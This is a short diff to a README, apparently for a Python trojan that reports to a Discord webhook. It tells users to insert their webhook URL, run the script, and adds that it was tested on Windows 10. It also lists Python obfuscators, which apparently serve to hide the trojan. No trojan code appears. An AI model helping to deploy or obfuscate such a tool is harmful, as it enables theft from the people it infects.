@@ -44,6 +44,9 @@ Replace "YOUR_WEBHOOK_HERE" on line 11 with your discord webhook url
 python discord_webhook_trojan.py
 ```
 
+## Tested on:
+- Windows 10
+
 # Good Python Obfuscators:
 - <https://github.com/htr-tech/PyObfuscate>
 - <https://github.com/Blank-c/BlankOBF>
